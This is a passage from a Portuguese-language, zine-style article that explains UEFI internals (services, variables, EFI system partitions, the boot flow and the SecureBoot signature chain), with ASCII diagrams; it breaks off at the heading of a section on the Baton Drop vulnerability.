    <g2>░░<g1>░<ww>            2010                                2018                     ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>       Expansão da UEFI                      Projeto Mu                  <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  +--------------------------+      +--------------------------+         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |&gt; BIOS ainda era o padrão,|      |&gt; Microsoft anuncia o     |         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |mas a UEFI começou a ser  |      |projeto Mu (um fork do    |         <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  |utilizada em massa        |      |EDKII da TianoCore para o |         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  |&gt; Diversas implementações | ---&gt; |Surface e o Hyper-V)      |         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  | da UEFI começaram a      |      |                          |         <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  | disponibilizar um modo de|      |                          |         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  | compatibilidade legado   |      |                          |         <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  +--------------------------+      +--------------------------+         <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  Analisando as atualizações e as funcionalidades adicionadas ao longo   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  dos anos, temos essa lista resumida:                                   ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>         1998 - 2005                           2005 - …                  ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>             EFI                                 UEFI                    ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  - Menos limitada comparada à         - Interfaces unificadas para      <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  BIOS, mas sem visão de unificação;   serviços e programação;           <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  - Adicionou suporte para drives.     - Padrão aberto com               ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  maiores que 2TB;                     implementação em C;               <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  - Permitiu independência de          - Adicionou suporte para USB,     ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  arquitetura;                         PCI/PCIe, SCSI, ACPI e            <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  - Design modular;                    Networking;                       ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  - Retrocompatibilidade via CSM       - Implementação de mecanismos     <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  (Compatibility Support Mode).        de segurança (SecureBoot e        <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>                                       driver signing);                  <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                       - Melhor UI;                      <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>                                       - Runtime services modernos;      ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                       - Shell própria.                  ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  [+]--------------------------------------------------------------[+]   ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   | 1. UEFI Internals 101                                          |    <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  [+]--------------------------------------------------------------[+]   ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>              [*]-----------------------------------[*]                  <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>               | 1.1 UEFI Services                   |                   <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>              [*]-----------------------------------[*]                  <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  A UEFI define dois tipos de serviços principais:                       <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   - Boot services: Disponíveis somente enquanto o firmware está         ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   sob controle da máquina (tudo antes da chamada da função              <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   ExitBootServices()), como serviços de controle de blocos,             <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   dispositivos e bus, por exemplo.                                      <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   - Runtime services: Disponíveis também durante o controle do SO,      ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   como serviços de data e hora e acesso de NVRAM.                       ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  Alguns desses principais serviços da UEFI são:                         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>   - UEFI Memory map                                                     <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   - SMM (espaço de memória usado pelo proc que tem acesso ao OS         ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   mas a recíproca não é verdadeira, bootkits gostam daqui ;])           ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   - ACPI                                                                ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   - SMBIOS                                                              ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   - Time                                                                <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>   - Variables                                                           <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  Vamos dar um pouco de destaque pro serviço de variáveis listado        <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  acima, onde essas variáveis UEFI (UEFI variables) são usadas como      <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  uma forma de guardar dados em áreas de memória não-volátil. Por        <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>  exemplo, variáveis UEFI podem ser usadas para armazenar mensagens de   <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  crash na NVRAM depois de um problema. Aqui um exemplo de variáveis     <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  UEFI em um sistema:                                                    <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   root@kharon ~# efivar --list                                          <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-SignatureSupport                 ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-BootOrder                        <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-SecureBoot                       ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   a04a27f4-df00-4d42-b552-39511302113d-Setup                            <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>   59d1c24f-50f1-401a-b101-f33e0daed443-SecureBootEnforce                ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-OsIndications                    ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   59d1c24f-50f1-401a-b101-f33e0daed443-PhysicalBootOrder                <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>   d719b2cb-3d3a-4596-a3bc-dad00e67656f-db                               <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-SetupMode                        <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-PK                               ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>   d719b2cb-3d3a-4596-a3bc-dad00e67656f-dbx                              ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-KEK                              <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   59d1c24f-50f1-401a-b101-f33e0daed443-CustomSecurity                   <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-Boot0003                         <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   8be4df61-93ca-11d2-aa0d-00e098032b8c-Boot0002                         <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>              [*]-----------------------------------[*]                  ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>               | 1.2 UEFI Applications               |                   ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>              [*]-----------------------------------[*]                  <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  Aplicações UEFI são arquivos guardados em partições EFI (chamadas de   ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  ESPs, a gente vai falar mais sobre essas partições jajá). Essas        ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  aplicações podem ser executadas pela UEFI Shell, pelo boot manager     <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  do firmware ou por outras aplicações UEFI (por sinal, bootloaders,     ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  como o GRUB e o Windows Boot Manager são aplicações UEFI, assim como   ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  a própria UEFI Shell, chame isso de recursão :P). Elas podem ser       ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  desenvolvidas e instaladas manualmente pelos OEMs do SO ou do          <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  hardware da sua máquina.                                               <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>              [*]-----------------------------------[*]                  <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>               | 1.3 EFI System Partitions           |                   ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>              [*]-----------------------------------[*]                  ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  As ESPs nada mais são que partições de armazenamento de dados          <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  acessados pelo firmware da UEFI durante a inicialização da máquina,    ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  nelas ficam armazenadas as aplicações UEFI e seus arquivos (como os    <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>  bootloaders que a gente comentou). As ESPs suportam os esquemas de     <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  partição MBR e GPT (não o chat, mas a GUID Partition Table), a MBR     ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  sendo suportada como parte do sistema de compatibilidade da BIOS       ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  (CSM). Em suma, a diferença entre as partições GPT e MBR está em sua   <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  arquitetura e na quantidade de partições suportadas:                   <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>        MBR (4 partições)                GPT (128 partições)             ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  +--------------------------+      +--------------------------+         ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  | Master Boot Record       |      | Protective MBR           |         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  +--------------------------+      +--------------------------+         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  | Primary Partition (C:).  |      | Primary GUID Header      |         <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  +--------------------------+      +--------------------------+         ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  | Primary Partition (E:)   |      | Primary GUID Entry Array |         ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +--------------------------+      +--------------------------+         ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  | Primary Partition (F:)   |      | Primary Partition (C:)   |         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  +--------------------------+      +--------------------------+         <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  | Extended Partition       |      | Primary Partition (E:)   |         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  +--------------------------+      +--------------------------+         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                    | Primary Partition n      |         <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>                                    +--------------------------+         <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                    | Backup GUID Entry Array  |         <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                    +--------------------------+         <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                    | Backup GUID Header       |         <g2>░░<g1>░<ww>
    ░<g1>░<g2>░<g1><ww>                                    +--------------------------+         ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>              [*]-----------------------------------[*]                  <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>               | 1.4 UEFI Booting                    |                   <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>              [*]-----------------------------------[*]                  <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  O boot usando a UEFI é diferente da BIOS, sendo as principais          ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  diferenças a implementação do SecureBoot (que veremos mais pra         ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  frente), uso de operações com velocidade de 64-bits e o abandono de    ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  uso de boot sectors por conta do uso de partições GPT (porém contudo   <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  todavia, boot sectors ainda podem ser utilizados pelo CSM caso o       <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  usuário opte usar partições MBR) no seu disco. Em vez de utilizar      <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  boot sectors, a UEFI define um Boot Manager como mecanismo             ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  principal, checando os dados de configuração de boot (BCD - Boot       <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  Configuration Data, dados esses definidos pelas variáveis que a        <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  gente estudou, armazenadas na NVRAM) e inicializando o bootloader do   <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  SO instalado naquele disco. Aqui um exemplo do fluxo de boot com       <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  UEFI no Windows:                                                       <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                +----------------+                                       <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>                | Máquina ligada |                                       <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>                +-------|--------+                                       <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                        |                                                <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                +-------↓--------+                                       <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>                | Firmware       |                                       ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                | bootloaders    |                                       <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                +-------|--------+                                       ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  +- UEFI --------------↓--------------------------------------------+   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |             +-----------------+         +-----------------+      |   <g2>░░<g1>░<ww>
    ·<g2>░<ww>░<g1><ww>  |             | Aplicações UEFI |         | Drivers UEFI e  |      |   ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  |             | de OEMs         |         | serviços        |      |   ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  |             +-----------------+         +-----------------+      |   <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  |+- Ambiente de Boot -|----------------------------------------+   |   <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  ||                    |                   +-----------------+  |   |   <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  ||            +-------↓---------+         | Bibliotecas de  |  |   |   <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  ||            |                 |         |      Boot       |  |   |   <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  ||            |   Windows Boot  |         +-----------------+  |   |   <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  ||            |     Manager     |                              |   |   <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  ||            |                 |         +-----------------+  |   |   <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  ||            |                 |         |       BCD       |  |   |   ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  ||            +----|------|-----+         +-----------------+  |   |   <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  |+-----------------|------|------------------------------------+   |   ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  +------------------|------|----------------------------------------+   <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>    +----------------↓+ +---↓-------------+                              ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>    |      SO         | | Atualizar SO    |                              <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>    +-----------------+ +-----------------+                              <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>              [*]-----------------------------------[*]                  ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>               | 1.5 UEFI SecureBoot                 |                   <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>              [*]-----------------------------------[*]                  <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  O SecureBoot nasceu como uma medida de proteção contra ameaças que     <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>  visavam modificar arquivos e aplicações durante o processo de boot     <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  da máquina, essas ameaças sendo normalmente bootkits e ataques de      <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  recuperação de senha de boot. Em suma, ele impede o carregamento de    <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>  UEFI drivers ou aplicações UEFI que não são assinados com uma          ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  assinatura digital, através de várias checagens à cada etapa do        ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  boot.                                                                  <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>  Quando o SecureBoot é ativado, ele inicia no modo “setup”,             <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  escrevendo uma chave pública mestra conhecida como Platform Key(PK)    ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  no firmware da máquina. Após essa escrita, ele entra no modo “user”    ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  onde apenas UEFI drivers e aplicações UEFI assinados com a PK podem    <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  ser carregados pelo firmware. Key Enrollment Keys (KEKs, aonde estão   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>  meus manos do WoW? XD) também podem ser adicionadas ao banco de        <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  dados de chaves guardado na memória para permitir o uso de outros      <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  certificados (embora essas KEKs possam ser adicionadas por usuários    ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>  para testes com certificados auto-assinados, elas ainda precisam ter   <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>  uma conexão com a PK para serem válidas). O fluxo de SecureBoot no     <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>  Windows funciona da seguinte forma (senta que lá vem história):        <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>                                                                         ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                    +----------------+                   +---------+     ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                    | Máquina ligada |---+      não +--&gt; | Erro no |     <g2>░░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                    +----------------+   |          |    | Boot    |     ░<g1>░<g2>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                         ↓          |    +---------+     <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>   +----------------+                   +----------------+      ^        ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>   | OEM_PK_HASH    |-------checa------&gt;| Ta assinado?   | -----+        <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>   +----------------+                   +----------------+      |        <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>         ^                                    |                 |        <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>         |                    +----- sim -----+                 |        <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>         |                    ↓                                 |        <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>         |      +----------------+      +----------------+      | não    <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>         |      | Bootloaders    |-----&gt;| Ta assinado?   |      |        ·<g2>░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>         |      | Pré-UEFI       |      +----------------+      |        <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>         |      +----------------+            |                 |        <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>         |                                    |                 |        ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>         |                  +----- sim -----+ |                 |        <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>         |                  ↓                                   |        <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>         |      +----------------+   +----------------+         |        <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>         |      | UEFI Boot      |--&gt;| Ta assinado?   |---------+        ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>         |      | Manager        |   +----------------+         |        ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>         |      +----------------+            |                 |        <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>         |                                    |                 |        <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>         |                                    |                 |        ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>         |                    +----- sim -----+                 |        ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>         |                    ↓                                 |        <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>         |      +----------------+   +----------------+         |        <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>         |      |Todos os drivers|--&gt;| Ta assinado?   |---------+        <g2>░<g1>░░<g1><ww>
    <g2>░░<g1>░<ww>         |      | e apps UEFI    |   +----------------+         |        ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>         |      +----------------+            |                 |        <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>         |                                    |                 |        <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>         |                    +----- sim -----+                 |        <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>         |                    ↓                                 |        <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>         |      +----------------+   +----------------+         |        ░<g1>░<g2>░<g1><ww>
    <g2>░░<ww>░<g1><ww>         |      | Windows Boot   |--&gt;| BCD Correto?   |---------+        ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>         |      | Manager        |   +----------------+         |        ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>         |      +----------------+      |           |           |        ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>         |                             sim    se não, aplicar   |        <g2>░░<g1>░<ww>
    <g2>░<g1>░░<g1><ww>         ↓                              |     valores de BCD    |        ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>   +----------------+                   |     default           |        <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   | Chaves UEFI    |                   |           |           |        <g2>░░<ww>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>   +----------------+                   ↓           ↓           |        ·<g2>░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                     +----------------+         |        <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>                                     | Ta assinado?   |---------+        ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                                     +----------------+         |        <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                                              |                 |        <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                              +----- sim -----+                 |        ·<g2>░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                              ↓                                 |        <g2>░<g1>░░<g1><ww>
    <g2>░░<ww>░<g1><ww>                    +----------------+   +----------------+     |        <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                    | Windows        |--&gt;| Ta assinado?   |-----+        <g2>░<g1>░░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                    | Bootloader     |   +----------------+              <g2>░<g1>░░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                    +----------------+           |                       <g2>░░<ww>░<g1><ww>
    <g2>░░<ww>░<g1><ww>                                                 |                       ░<g1>░<g2>░<g1><ww>
    ░<g1>░<g2>░<g1><ww>                                 +----- sim -----+                       <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                 ↓                                       <g2>░░<g1>░<ww>
    <g2>░░<ww>░<g1><ww>                      +----------------+                                 ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                      | Boot do SO e   |                                 ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                      | seus drivers   |                                 <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>                      +----------------+                                 <g2>░░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>                                                                         ░<g1>░<g2>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>                                                                         ·<g2>░<ww>░<g1><ww>
    ·<g2>░<ww>░<g1><ww>  Agora que a gente entendeu (ou pelo menos espero que tenha entendido   ░<g1>░<g2>░<g1><ww>
    <g2>░░<g1>░<ww>  :P) melhor sobre o SecureBoot, vamos pra parte interessante de fato    <g2>░░<g1>░<ww>
    <g2>░░<g1>░<ww>  :]                                                                     <g2>░<g1>░░<g1><ww>
    <g2>░<g1>░░<g1><ww>                                                                         <g2>░░<ww>░<g1><ww>
    <g2>░<g1>░░<g1><ww>  [*]--------------------------------------------------------------[*]   ·<g2>░<ww>░<g1><ww>
    <g2>░░<g1>░<ww>   | 2. Baton Drop (CVE-2022-21894)                                 |    <g2>░<g1>░░<g1><ww>
